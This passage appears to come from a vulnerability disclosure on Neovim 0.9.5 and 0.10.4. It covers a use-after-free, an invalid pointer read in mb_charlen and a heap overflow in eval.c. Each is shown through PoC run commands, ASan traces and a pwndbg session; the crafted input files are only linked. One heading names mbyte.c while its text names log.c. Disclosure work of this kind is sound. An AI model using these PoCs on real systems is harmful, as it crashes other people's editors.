    #27 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #28 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #29 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3

Direct leak of 2336 byte(s) in 2 object(s) allocated from:
    #0 0x4fc002 in calloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fc002)
    #1 0x13a364b in xcalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:158:15
    #2 0x1b9ce36 in ex_ownsyntax /root/vuln/nvims/neovim-0.10.4/src/nvim/syntax.c:5247:19
    #3 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #4 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #5 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #6 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #7 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #8 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #9 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #10 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #11 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #12 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #13 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #14 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #15 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #16 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #17 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #18 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #19 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #20 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #21 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #22 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #23 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #24 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #25 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #26 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #27 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #28 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #29 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5

Direct leak of 1168 byte(s) in 1 object(s) allocated from:
    #0 0x4fc002 in calloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fc002)
    #1 0x13a364b in xcalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:158:15
    #2 0x1b9ce36 in ex_ownsyntax /root/vuln/nvims/neovim-0.10.4/src/nvim/syntax.c:5247:19
    #3 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #4 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #5 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #6 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #7 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #8 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #9 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #10 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #11 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #12 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #13 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #14 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #15 0x7f521a01bd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: 10512 byte(s) leaked in 9 allocation(s).
```

# 4. Neovim <=0.10.4 Use-After-Free in `src/nvim/mbyte.c`

## Description
Neovim versions up to and including 0.10.4 are affected by a vulnerability where a use-after-free occurs in the `log.c` file at function `logmsg`. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to access memory that has already been freed. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C2324262](./C2324262).
The `timeout 20s` command is needed to prevent it from running endlessly.
```sh
$ timeout 20s ./nvims/neovim-0.10.4/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C2324262 -c :qa!  
Vim: Caught deadly signal 'SIGTERM'

Vim: Finished.
FATAL: error in free_all_mem
 (null) emsg_multiline 716: =================================================================
==18432==ERROR: AddressSanitizer: heap-use-after-free on address 0x621000029500 at pc 0x00000049ed98 bp 0x7ffe5b5b5e20 sp 0x7ffe5b5b55a0
READ of size 2 at 0x621000029500 thread T0
    #0 0x49ed97 in printf_common(void*, char const*, __va_list_tag*) (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x49ed97)
    #1 0x10eba57 in logmsg /root/vuln/nvims/neovim-0.10.4/src/nvim/log.c:158:5
    #2 0x13d5203 in emsg_multiline /root/vuln/nvims/neovim-0.10.4/src/nvim/message.c:716:7
    #3 0x13d69c6 in emsg /root/vuln/nvims/neovim-0.10.4/src/nvim/message.c:767:10
    #4 0x13d6d71 in semsgv /root/vuln/nvims/neovim-0.10.4/src/nvim/message.c:822:10
    #5 0x13d6c4c in semsg /root/vuln/nvims/neovim-0.10.4/src/nvim/message.c:785:9
    #6 0x171b46a in check_quickfix_busy /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:1849:5
    #7 0x13a7d54 in free_all_mem /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:881:3
    #8 0x11c9b4e in os_exit /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:696:3
    #9 0x11d07db in getout /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:823:3
    #10 0x11d0d30 in preserve_exit /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:878:3
    #11 0x16b0818 in deadly_signal /root/vuln/nvims/neovim-0.10.4/src/nvim/os/signal.c:181:3
    #12 0x16b045c in on_signal /root/vuln/nvims/neovim-0.10.4/src/nvim/os/signal.c:206:7
    #13 0xd5bb5d in signal_event /root/vuln/nvims/neovim-0.10.4/src/nvim/event/signal.c:47:3
    #14 0xd49712 in multiqueue_process_events /root/vuln/nvims/neovim-0.10.4/src/nvim/event/multiqueue.c:149:7
    #15 0xd42240 in loop_poll_events /root/vuln/nvims/neovim-0.10.4/src/nvim/event/loop.c:83:3
    #16 0x169256d in os_breakcheck /root/vuln/nvims/neovim-0.10.4/src/nvim/os/input.c:204:3
    #17 0x16925e3 in line_breakcheck /root/vuln/nvims/neovim-0.10.4/src/nvim/os/input.c:219:5
    #18 0x177fd9c in vgr_match_buflines /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:5415:5
    #19 0x173a095 in vgr_process_files /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:5558:26
    #20 0x172e376 in ex_vimgrep /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:5670:16
    #21 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #22 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #23 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #24 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #25 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #26 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #27 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #28 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #29 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #30 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #31 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #32 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #33 0x7f22e897bd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #34 0x7f22e897be3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #35 0x480fc4 in _start (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x480fc4)

0x621000029500 is located 0 bytes inside of 4096-byte region [0x621000029500,0x62100002a500)
freed by thread T0 here:
    #0 0x4fbc22 in free (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbc22)
    #1 0x13a35a9 in xfree /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:144:3
    #2 0x18cfe05 in free_scriptnames /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2425:3
    #3 0xa871dd in eval_clear /root/vuln/nvims/neovim-0.10.4/src/nvim/eval.c:527:3
    #4 0x13a7576 in free_all_mem /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:866:3
    #5 0x11c9b4e in os_exit /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:696:3
    #6 0x11d07db in getout /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:823:3
    #7 0x11d0d30 in preserve_exit /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:878:3
    #8 0x16b0818 in deadly_signal /root/vuln/nvims/neovim-0.10.4/src/nvim/os/signal.c:181:3
    #9 0x16b045c in on_signal /root/vuln/nvims/neovim-0.10.4/src/nvim/os/signal.c:206:7
    #10 0xd5bb5d in signal_event /root/vuln/nvims/neovim-0.10.4/src/nvim/event/signal.c:47:3
    #11 0xd49712 in multiqueue_process_events /root/vuln/nvims/neovim-0.10.4/src/nvim/event/multiqueue.c:149:7
    #12 0xd42240 in loop_poll_events /root/vuln/nvims/neovim-0.10.4/src/nvim/event/loop.c:83:3
    #13 0x169256d in os_breakcheck /root/vuln/nvims/neovim-0.10.4/src/nvim/os/input.c:204:3
    #14 0x16925e3 in line_breakcheck /root/vuln/nvims/neovim-0.10.4/src/nvim/os/input.c:219:5
    #15 0x177fd9c in vgr_match_buflines /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:5415:5
    #16 0x173a095 in vgr_process_files /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:5558:26
    #17 0x172e376 in ex_vimgrep /root/vuln/nvims/neovim-0.10.4/src/nvim/quickfix.c:5670:16
    #18 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #19 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #20 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #21 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #22 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #23 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #24 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #25 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #26 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #27 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #28 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #29 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5

previously allocated by thread T0 here:
    #0 0x4fbe8d in malloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbe8d)
    #1 0x13a32f7 in try_malloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:98:15
    #2 0x13a34ec in xmalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:132:15
    #3 0x16b80a5 in FullName_save /root/vuln/nvims/neovim-0.10.4/src/nvim/path.c:504:15
    #4 0x16c4ca9 in fix_fname /root/vuln/nvims/neovim-0.10.4/src/nvim/path.c:1894:10
    #5 0x18c72b8 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2062:21
    #6 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #7 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #8 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #9 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #10 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #11 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #12 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #13 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #14 0x7f22e897bd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-use-after-free (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x49ed97) in printf_common(void*, char const*, __va_list_tag*)
Shadow bytes around the buggy address:
  0x0c427fffd250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fffd260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fffd270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fffd280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fffd290: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c427fffd2a0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c427fffd2b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c427fffd2c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c427fffd2d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c427fffd2e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c427fffd2f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==18432==ABORTING
```

There is also another out of range pointer offset access, in the `mb_charlen` function of neovim version 0.9.5, which can lead to a segmentation fault. This issue is triggered when processing specially crafted file, that causes the application to access an invalid memory location.
```sh
$ ./nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C2324262 -c :qa!                                                    
[1]    3353079 segmentation fault (core dumped)  ./nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S  -c :qa
$ gdb ./nvims/neovim-0.9.5/build/bin/nvim -q         
pwndbg: loaded 174 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./nvims/neovim-0.9.5/build/bin/nvim...
------- tip of the day (disable with set show-tips off) -------
If you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on
pwndbg> set args -u NONE -i NONE -e -n -m -X -s -S ./C2324262 -c :qa!    
pwndbg> r
Starting program: /root/vuln/nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C2324262 -c :qa!    
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000557c92934b61 in mb_charlen (str=0x557c26aa4f33 <error: Cannot access memory at address 0x557c26aa4f33>) at /root/vuln/nvims/neovim-0.9.5/src/nvim/mbyte.c:2020
2020      for (count = 0; *p != NUL; count++) {
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x557c26aa4f33
 RBX  0x557c93502973 ◂— 0x2a676600207373 /* 'ss ' */
 RCX  0x7ffecf3bfbfc ◂— 0x20000005f /* '_' */
 RDX  0
 RDI  0x557c26aa4f33
 RSI  0x557c93502973 ◂— 0x2a676600207373 /* 'ss ' */
 R8   0x7ffecf3bfc20 ◂— 0x1900000018
 R9   0x100
 R10  0x557c9354fa50 ◂— 0x170
 R11  0x7f3e12674ce0 (main_arena+96) —▸ 0x557c93564620 ◂— 0
 R12  0
 R13  5
 R14  0x7ffecf3c01b0 ◂— 0x7ffffe65
 R15  0x7ffecf3c01d8 —▸ 0x557c9350b3a0 —▸ 0x557c92d05420 (nfa_regengine) —▸ 0x557c929f144c (nfa_regcomp) ◂— endbr64 
 RBP  0x7ffecf3bfb30 —▸ 0x7ffecf3bfbb0 —▸ 0x7ffecf3c0050 —▸ 0x7ffecf3c0150 —▸ 0x7ffecf3c02b0 ◂— ...
 RSP  0x7ffecf3bfb10 —▸ 0x557c93551f72 ◂— 'CFLAGS="-fsanitize=address -g" \\'
 RIP  0x557c92934b61 (mb_charlen+73) ◂— movzx eax, byte ptr [rax]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x557c92934b61 <mb_charlen+73>        movzx  eax, byte ptr [rax]     <Cannot dereference [0x557c26aa4f33]>
   0x557c92934b64 <mb_charlen+76>        test   al, al
   0x557c92934b66 <mb_charlen+78>        jne    mb_charlen+47               <mb_charlen+47>
 
   0x557c92934b68 <mb_charlen+80>        mov    eax, dword ptr [rbp - 0xc]
   0x557c92934b6b <mb_charlen+83>        leave  
   0x557c92934b6c <mb_charlen+84>        ret    
 
   0x557c92934b6d <mb_charlen_len>       endbr64 
   0x557c92934b71 <mb_charlen_len+4>     push   rbp
   0x557c92934b72 <mb_charlen_len+5>     mov    rbp, rsp
   0x557c92934b75 <mb_charlen_len+8>     sub    rsp, 0x20
   0x557c92934b79 <mb_charlen_len+12>    mov    qword ptr [rbp - 0x18], rdi
─────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────
In file: /root/vuln/nvims/neovim-0.9.5/src/nvim/mbyte.c:2020
   2015 
   2016   if (p == NULL) {
   2017     return 0;
   2018   }
   2019 
 ► 2020   for (count = 0; *p != NUL; count++) {
   2021     p += utfc_ptr2len(p);
   2022   }
   2023 
   2024   return count;
   2025 }
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffecf3bfb10 —▸ 0x557c93551f72 ◂— 'CFLAGS="-fsanitize=address -g" \\'
01:0008│-018 0x7ffecf3bfb18 ◂— 0x557c26aa4f33
02:0010│-010 0x7ffecf3bfb20 ◂— 0
03:0018│-008 0x7ffecf3bfb28 ◂— 0x557c26aa4f33
04:0020│ rbp 0x7ffecf3bfb30 —▸ 0x7ffecf3bfbb0 —▸ 0x7ffecf3c0050 —▸ 0x7ffecf3c0150 —▸ 0x7ffecf3c02b0 ◂— ...
05:0028│+008 0x7ffecf3bfb38 —▸ 0x557c92a00d11 (fuzzy_match+64) ◂— mov dword ptr [rbp - 0x2c], eax
06:0030│+010 0x7ffecf3bfb40 —▸ 0x557c9354f4a0 ◂— 1
07:0038│+018 0x7ffecf3bfb48 —▸ 0x7ffecf3bfc20 ◂— 0x1900000018
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x557c92934b61 mb_charlen+73
   1   0x557c92a00d11 fuzzy_match+64
   2   0x557c929bda88 vgr_match_buflines+987
   3   0x557c929be0ca vgr_process_files+678
   4   0x557c929be546 ex_vimgrep+413
   5   0x557c9288c73f execute_cmd0+779
   6   0x557c9288e673 do_one_cmd+4623
   7   0x557c9288a11f do_cmdline+2577
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

# 5. Neovim <=0.9.5 Heap Buffer Overflow in `src/nvim/eval.c`

## Description
Neovim versions up to and including 0.9.5 are affected by a vulnerability where a heap buffer overflow occurs in the `eval.c` file at line 8088. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to write beyond the allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C230054](./C230054).
```sh
$ ./nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C230054 -c :qa! 
=================================================================
==3185407==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110000020bf at pc 0x0000004df878 bp 0x7ffcdd4b92b0 sp 0x7ffcdd4b8a70
WRITE of size 2 at 0x6110000020bf thread T0
    #0 0x4df877 in strcpy (/root/vuln/nvims/neovim-0.9.5/build/bin/nvim+0x4df877)
    #1 0xb2e6b8 in do_string_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:8088:7
    #2 0xb2beb7 in modify_fname /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:7985:15
    #3 0xe2c3ea in eval_vars /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:6974:16
    #4 0xe26086 in expand_filename /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:3773:18
    #5 0xe156b6 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1557:9
    #6 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #7 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #8 0xcf632f in call_user_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1122:5
    #9 0xd019d8 in call_user_func_check /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1259:5
    #10 0xceee8e in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1613:17
    #11 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #12 0xb4be74 in eval_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2193:13
    #13 0xb3eef0 in eval7 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:3000:15
    #14 0xb3bee1 in eval6 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2742:7
    #15 0xb3a0d7 in eval5 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2597:7
    #16 0xb38a96 in eval4 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2467:7
    #17 0xb37f78 in eval3 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2399:7
    #18 0xae7428 in eval2 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2342:7
    #19 0xad6a5a in eval1 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2280:7
    #20 0xad4494 in eval0 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2236:9
    #21 0xad7600 in eval_to_string /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:871:7
    #22 0x172bfd3 in vim_regsub_both /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1824:31
    #23 0x17320ac in vim_regsub_multi /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1696:16
    #24 0xdc16b7 in do_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:3902:20
    #25 0xdb678a in ex_substitute /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:4673:9
    #26 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #27 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #28 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #29 0xcf632f in call_user_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1122:5
    #30 0xd019d8 in call_user_func_check /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1259:5
    #31 0xceee8e in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1613:17
    #32 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #33 0xb4be74 in eval_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2193:13
    #34 0xb3eef0 in eval7 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:3000:15
    #35 0xb3bee1 in eval6 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2742:7
    #36 0xb3a0d7 in eval5 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2597:7
    #37 0xb38a96 in eval4 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2467:7
    #38 0xb37f78 in eval3 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2399:7
    #39 0xae7428 in eval2 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2342:7
    #40 0xad6a5a in eval1 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2280:7
    #41 0xad4494 in eval0 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2236:9
    #42 0xad7600 in eval_to_string /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:871:7
    #43 0x172bfd3 in vim_regsub_both /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1824:31
    #44 0x17320ac in vim_regsub_multi /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1696:16
    #45 0xdc16b7 in do_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:3902:20
    #46 0xdb678a in ex_substitute /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:4673:9
    #47 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #48 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #49 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
